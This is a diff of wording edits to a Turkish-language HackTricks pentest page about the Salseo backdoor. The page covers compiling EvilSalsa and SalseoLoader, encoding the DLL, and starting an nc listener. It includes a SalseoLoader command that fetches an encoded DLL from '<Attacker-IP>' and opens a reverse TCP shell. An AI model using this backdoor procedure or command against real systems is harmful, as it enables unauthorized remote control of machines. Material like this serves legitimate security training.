@@ -9,15 +9,15 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-## Binaries'leri Derleme
+## Binaries'ı Derleme
 
-Github'dan kaynak kodunu indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
+Github'dan kaynak kodunu indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekecek.
 
 Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, bu mimariler için derleyin).
 
@@ -27,13 +27,13 @@ Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer
 
 ![](<../.gitbook/assets/image (839).png>)
 
-Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlarda çalıştırılabilir dosyanın yolu görünecektir):
+Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlar içinde çalıştırılabilir dosyanın yolu görünecektir):
 
 ![](<../.gitbook/assets/image (381).png>)
 
 ## Arka Kapıyı Hazırlama
 
-Öncelikle, **EvilSalsa.dll**'yi kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python script'ini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+Öncelikle, **EvilSalsa.dll**'yi kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
@@ -53,7 +53,7 @@ Tamam, şimdi Salseo işlemlerini gerçekleştirmek için ihtiyacınız olan her
 
 ### **TCP ters shell almak (HTTP üzerinden encoded dll indirme)**
 
-nc'yi ters shell dinleyicisi olarak başlatmayı ve encoded evilsalsa'yı sunmak için bir HTTP sunucusu kurmayı unutmayın.
+Ters shell dinleyicisi olarak bir nc başlatmayı ve encoded evilsalsa'yı sunmak için bir HTTP sunucusu kurmayı unutmayın.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
